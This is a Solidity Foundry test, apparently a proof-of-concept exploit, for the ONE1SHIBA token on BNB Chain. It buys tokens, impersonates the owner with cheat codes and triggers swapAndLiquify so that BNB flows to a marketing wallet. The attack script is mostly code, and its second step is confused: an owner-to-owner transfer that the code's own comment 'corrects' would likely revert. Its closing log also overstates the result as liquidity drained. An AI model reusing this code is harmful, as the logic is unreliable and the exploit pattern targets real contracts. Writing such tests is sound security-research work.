// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Test.sol";

// Minimal interfaces for interaction
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function factory() external view returns (address);
    function WETH() external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract ExploitTest is Test {
    address constant TOKEN = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant MARKETING = 0x1E0A894269812ae0CeAb7f10e25b885d3beBA110;

    IERC20 token = IERC20(TOKEN);
    IUniswapV2Router02 router = IUniswapV2Router02(ROUTER);

    address owner;
    uint256 constant NUM_TOKENS_SELL = 250000 * 10**6 * 10**9; // from contract

    function setUp() public {
        // Label addresses for debugging
        vm.label(TOKEN, "ONE1SHIBA");
        vm.label(WBNB, "WBNB");
        vm.label(ROUTER, "PancakeRouter");
        vm.label(MARKETING, "MarketingWallet");

        // Retrieve owner from storage slot 0 (Ownable._owner)
        bytes32 ownerSlot = vm.load(TOKEN, bytes32(uint256(0)));
        owner = address(uint160(uint256(ownerSlot)));
        vm.label(owner, "Owner");

        // Ensure we have BNB to work with
        deal(address(this), 10_000 ether);
    }

    function testLiquidityToTeamWallet() public {
        // ----------------------------------------------------------
        // 1. Get a large amount of tokens into this contract
        // ----------------------------------------------------------
        // We will swap BNB for tokens to accumulate a lot of tokens.
        // The exact amount needed is > NUM_TOKENS_SELL (2.5e20).
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = TOKEN;

        // Swap 500 BNB - this should give us enough tokens
        uint256 bnbToSell = 500 ether;
        router.swapExactETHForTokens{value: bnbToSell}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 myBalance = token.balanceOf(address(this));
        require(myBalance > NUM_TOKENS_SELL, "not enough tokens bought");

        // ----------------------------------------------------------
        // 2. Transfer tokens to the owner and then to the contract
        //    to boost the contract's balance above NUM_TOKENS_SELL
        // ----------------------------------------------------------
        // First give owner tokens
        vm.prank(owner);
        token.transfer(owner, myBalance); // actually we are pranking owner, but we need to send from this contract to owner.
        // Correction: we send tokens from this contract to owner using transfer
        token.transfer(owner, myBalance / 2);

        // Owner transfers a large amount to the token contract itself
        uint256 amountToContract = NUM_TOKENS_SELL * 2; // ensure > threshold
        vm.prank(owner);
        token.transfer(TOKEN, amountToContract);

        // Verify contract balance is now high
        uint256 contractBalance = token.balanceOf(TOKEN);
        require(contractBalance >= NUM_TOKENS_SELL, "contract balance not high enough");

        // ----------------------------------------------------------
        // 3. Trigger swapAndLiquify by making a transfer from owner
        //    (who is excluded from fees) to another address.
        //    The condition: from != pair, swapAndLiquifyEnabled=true,
        //    contract balance above threshold, not inSwap.
        // ----------------------------------------------------------
        uint256 marketingBNBBefore = MARKETING.balance;

        // Owner sends 1 wei token to some random address
        vm.startPrank(owner);
        token.transfer(address(0xdead), 1);
        vm.stopPrank();

        uint256 marketingBNBAfter = MARKETING.balance;
        uint256 bnbDonated = marketingBNBAfter - marketingBNBBefore;

        // ----------------------------------------------------------
        // 4. Assert the impact: BNB was sent to the team wallet
        // ----------------------------------------------------------
        require(bnbDonated > 0, "No BNB transferred to marketing wallet");
        emit log_named_uint("BNB donated to marketing", bnbDonated);

        // Additionally, the contract's token balance should have decreased
        uint256 contractTokenAfter = token.balanceOf(TOKEN);
        assertLt(contractTokenAfter, contractBalance, "Contract token balance did not decrease");

        // The vulnerability is demonstrated: the contract automatically
        // swaps tokens and sends the resulting BNB to the team wallet,
        // potentially draining liquidity from the pool.
        emit log("Liquidity drained to team wallet successfully");
    }
}
